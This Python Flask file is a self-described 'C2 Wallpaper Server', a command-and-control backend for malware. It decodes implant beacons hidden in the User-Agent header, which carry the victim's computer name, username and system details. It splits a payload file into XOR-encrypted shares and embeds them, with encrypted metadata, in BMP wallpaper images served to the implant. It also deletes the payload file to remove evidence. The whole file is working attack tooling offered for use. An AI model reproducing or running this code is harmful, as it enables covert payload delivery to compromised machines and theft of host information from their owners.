import os
import random
import struct
import glob
import io
import base64
from flask import Flask, send_file, abort, request

app = Flask(__name__)

# --- CONFIGURATION ---
WALLPAPER_DIR = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_FILENAME = "pay.bin"

# --- GLOBAL STATE ---
# Stores the active payload shares to be injected into specific images
# Structure: {
#   'active': bool,
#   'offset': int,
#   'size': int,
#   'targets': { file_index: bytes_data, ... },
#   'counter': int,
#   'metadata_sent': bool,
#   'xor_key': int  # Dynamic key from tick_count
# }
SERVER_STATE = {
    'active': False,
    'offset': 0,
    'size': 0,
    'targets': {},
    'counter': 0,
    'metadata_sent': False,
    'xor_key': 0
}

def get_wallpaper_files():
    """Returns a sorted list of absolute paths to BMP files."""
    pattern = os.path.join(WALLPAPER_DIR, '*.bmp')
    # Sort ensures indices (0, 1, 2...) are consistent between requests
    return sorted(glob.glob(pattern))

def load_file_data(file_path):
    """Load file into memory as bytearray."""
    with open(file_path, "rb") as f:
        return bytearray(f.read())

def xor_data(data, key):
    """XOR bytes with a single byte key."""
    return bytes([b ^ key for b in data])

def parse_tick_count_from_ua():
    """Parse tick_count from User-Agent header.
    
    User-Agent format: base64(hex(SystemInfoStruct))
    SystemInfoStruct layout (packed):
        magic:           4 bytes  (offset 0)
        padding1:       13 bytes  (offset 4)
        computer_name:  32 bytes  (offset 17)
        padding2:        7 bytes  (offset 49)
        username:       32 bytes  (offset 56)
        padding3:       19 bytes  (offset 88)
        os_major:        4 bytes  (offset 107)
        os_minor:        4 bytes  (offset 111)
        os_build:        4 bytes  (offset 115)
        padding4:       11 bytes  (offset 119)
        num_processors:  4 bytes  (offset 130)
        page_size:       4 bytes  (offset 134)
        padding5:       23 bytes  (offset 138)
        total_memory:    8 bytes  (offset 161)
        padding6:        9 bytes  (offset 169)
        tick_count:      4 bytes  (offset 178)
        padding7:       17 bytes  (offset 182)
        checksum:        4 bytes  (offset 199)
    Total: 203 bytes = 406 hex chars
    """
    try:
        ua = request.headers.get('User-Agent', '')
        if not ua or len(ua) < 100:  # Too short to be valid
            print(f"[-] Invalid User-Agent: too short ({len(ua)} chars)")
            return 0
        
        # Base64 decode
        decoded = base64.b64decode(ua)
        hex_string = decoded.decode('ascii')
        
        print(f"\n{'='*60}")
        print(f"[+] BEACON RECEIVED")
        print(f"{'='*60}")
        print(f"[*] User-Agent length: {len(ua)} base64 chars")
        print(f"[*] Decoded hex length: {len(hex_string)} chars ({len(hex_string)//2} bytes)")
        
        # Parse struct fields from hex string (each byte = 2 hex chars)
        def get_bytes(offset, size):
            start = offset * 2
            end = start + size * 2
            return bytes.fromhex(hex_string[start:end])
        
        def get_uint32(offset):
            return struct.unpack('<I', get_bytes(offset, 4))[0]
        
        def get_uint64(offset):
            return struct.unpack('<Q', get_bytes(offset, 8))[0]
        
        def get_string(offset, size):
            data = get_bytes(offset, size)
            return data.split(b'\x00')[0].decode('ascii', errors='replace')
        
        # Parse and display all fields
        magic = get_uint32(0)
        computer_name = get_string(17, 32)
        username = get_string(56, 32)
        os_major = get_uint32(107)
        os_minor = get_uint32(111)
        os_build = get_uint32(115)
        num_processors = get_uint32(130)
        page_size = get_uint32(134)
        total_memory = get_uint64(161)
        tick_count = get_uint32(178)
        checksum = get_uint32(199)
        
        print(f"[*] Magic: 0x{magic:08X} {'(VALID)' if magic == 0xCAFEBABE else '(INVALID!)'}")
        print(f"[*] Computer Name: {computer_name}")
        print(f"[*] Username: {username}")
        print(f"[*] OS Version: {os_major}.{os_minor}.{os_build}")
        print(f"[*] Processors: {num_processors}")
        print(f"[*] Page Size: {page_size}")
        print(f"[*] Total Memory: {total_memory / (1024**3):.2f} GB")
        print(f"[*] Tick Count: {tick_count} (0x{tick_count:08X})")
        print(f"[*] XOR Key (low byte): 0x{tick_count & 0xFF:02X}")
        print(f"[*] Checksum: 0x{checksum:08X}")
        print(f"{'='*60}\n")
        
        # Return low byte as XOR key
        return tick_count & 0xFF
    except Exception as e:
        print(f"[-] Failed to parse User-Agent: {e}")
        import traceback
        traceback.print_exc()
        return 0

def process_bin(xor_key):
    """Process pay.bin if it exists, create XOR streams and update global state."""
    pay_path = os.path.join(WALLPAPER_DIR, PAYLOAD_FILENAME)
    
    if not os.path.exists(pay_path):
        return False
    
    if xor_key == 0:
        print("[-] Could not parse tick_count from User-Agent, skipping bin processing")
        return False
        
    print(f"[!] TRIGGER: Found {PAYLOAD_FILENAME}. Processing payload...")
    print(f"[+] XOR Key from tick_count: 0x{xor_key:02X}")
    
    # Read and delete bin
    with open(pay_path, "rb") as f:
        pay_content = f.read()
    os.remove(pay_path)  # Cleanup evidence
    
    # XOR the bin with the key first
    # This way: s1 ^ s2 = bin ^ key
    # Client does: s1 ^ s2 ^ key = bin
    bin_xored = bytearray(b ^ xor_key for b in pay_content)
    
    # Prepare the "Split-XOR" Payload
    payload_size = len(pay_content)
    # Pick random request indices between 1 and 10 (request order, not filename)
    target_indices = random.sample(range(2, 11), 2)
    
    # Pick a random offset for the payload
    payload_offset = random.randint(100, 1024)

    # Create the two XOR streams (from the pre-XORed bin)
    stream1 = bytearray(random.getrandbits(8) for _ in range(payload_size))
    stream2 = bytearray(a ^ b for a, b in zip(stream1, bin_xored))
    
    # Update Global State
    SERVER_STATE['active'] = True
    SERVER_STATE['offset'] = payload_offset
    SERVER_STATE['size'] = payload_size
    SERVER_STATE['counter'] = 0
    SERVER_STATE['metadata_sent'] = False
    SERVER_STATE['xor_key'] = xor_key
    SERVER_STATE['targets'] = {
        target_indices[0]: stream1,
        target_indices[1]: stream2
    }
    
    print(f"[+] State Updated: Target Request Indices {target_indices} at offset {payload_offset}")
    return True

def prepare_metadata(current_xor_key):
    """Prepare metadata containing target indices, offset and size."""
    target_indices = list(SERVER_STATE['targets'].keys())
    # Structure: [MAGIC_START (4)] [INDEX1 (4)] [INDEX2 (4)] [OFFSET (4)] [SIZE (4)] [MAGIC_END (4)]
    # Total: 24 bytes
    magic_start = 0xDEADBEEF
    magic_end = 0xBEEFDEAD
    
    metadata = struct.pack("<I I I I I I", 
                          magic_start,
                          target_indices[0], 
                          target_indices[1], 
                          SERVER_STATE['offset'], 
                          SERVER_STATE['size'],
                          magic_end)
    
    print(f"[*] Metadata (plaintext): {metadata.hex()}")
    print(f"[*] Using XOR key: 0x{current_xor_key:02X}")
    
    # XOR encrypt using CURRENT request's key (client will use same key to decrypt)
    encrypted_metadata = xor_data(metadata, current_xor_key)
    print(f"[*] Metadata (encrypted): {encrypted_metadata.hex()}")
    return encrypted_metadata

def embed_xor_stream(file_data, current_xor_key):
    """Embed XOR stream or metadata into file data based on request state."""
    if not SERVER_STATE['active']:
        return
        
    SERVER_STATE['counter'] += 1
    print(f"[*] Request Counter: {SERVER_STATE['counter']}")
    
    # First request after bin found: embed metadata
    if not SERVER_STATE['metadata_sent']:
        print(f"[*] Request #{SERVER_STATE['counter']} - Injecting Metadata")
        
        # Use CURRENT request's XOR key for metadata encryption
        # (client will decrypt with its current tick_count)
        metadata = prepare_metadata(current_xor_key)
        # Embed at totally random offset (avoid header ~54 bytes)
        if len(file_data) > 100:
            random_offset = random.randint(54, len(file_data) - len(metadata) - 10)
            print(f"[+] Injecting Metadata at offset {random_offset}")
            
            for i, b in enumerate(metadata):
                if random_offset + i < len(file_data):
                    file_data[random_offset + i] = b
        
        SERVER_STATE['metadata_sent'] = True
        return
    
    # Subsequent requests: check if current request matches target indices
    if SERVER_STATE['counter'] in SERVER_STATE['targets']:
        print(f"[*] Request #{SERVER_STATE['counter']} - Injecting XOR Stream")
        
        stream_data = SERVER_STATE['targets'][SERVER_STATE['counter']]
        offset = SERVER_STATE['offset']
        
        # Inject the stream at the specified offset
        if len(file_data) > offset + len(stream_data):
            for i, b in enumerate(stream_data):
                if offset + i < len(file_data):
                    file_data[offset + i] = b

@app.route('/wallpaper')
def random_wallpaper():
    try:
        files = get_wallpaper_files()
        if not files:
            abort(404, description="No wallpaper files found")

        # Always parse and display beacon data
        xor_key = parse_tick_count_from_ua()
        
        # Pick a random file
        chosen_index = random.randint(0, len(files) - 1)
        current_file_path = files[chosen_index]
        print(f"[*] Serving: {os.path.basename(current_file_path)}")
        
        # Load file into memory (DO NOT MODIFY DISK)
        file_data = load_file_data(current_file_path)

        # Process bin if it exists (pass the already-parsed xor_key)
        process_bin(xor_key)

        # Handle existing payload state and embed XOR streams
        embed_xor_stream(file_data, xor_key)

        # Serve the file
        return send_file(
            io.BytesIO(file_data),
            mimetype='image/bmp',
            download_name=os.path.basename(current_file_path)
        )

    except Exception as e:
        import traceback
        traceback.print_exc()
        abort(500, description=f"Error: {str(e)}")

@app.route('/')
def index():
    files = get_wallpaper_files()
    xor_key_display = f"0x{SERVER_STATE['xor_key']:02X}" if SERVER_STATE['active'] else 'None'
    return f"""
    <h1>C2 Wallpaper Server</h1>
    <p>Wallpapers: {len(files)}</p>
    <p>Payload Active: {SERVER_STATE['active']}</p>
    <p>Request Counter: {SERVER_STATE['counter']}</p>
    <p>Metadata Sent: {SERVER_STATE['metadata_sent']}</p>
    <p>Target Request Indices: {list(SERVER_STATE['targets'].keys()) if SERVER_STATE['active'] else 'None'}</p>
    <p>Offset: {SERVER_STATE['offset'] if SERVER_STATE['active'] else 'None'}</p>
    <p>XOR Key: {xor_key_display}</p>
    """

if __name__ == '__main__':
    # Ensure we have some dummy wallpapers to serve
    if not os.path.exists(WALLPAPER_DIR): os.makedirs(WALLPAPER_DIR)
    
    # Generate dummy BMPs if none exist
    if not glob.glob(os.path.join(WALLPAPER_DIR, '*.bmp')):
        print("[-] No BMPs found. Generating dummy wallpapers...")
        for i in range(10):  # Generate 10 files to match indices 1-10
            with open(os.path.join(WALLPAPER_DIR, f"wallpaper{i}.bmp"), "wb") as f:
                # Valid BMP Header + Random Noise
                header = b'BM' + (1024*50).to_bytes(4, 'little') + b'\x00'*4 + b'\x36\x00\x00\x00'
                f.write(header + os.urandom(1024*50))

    app.run(debug=True, host='0.0.0.0', port=5000)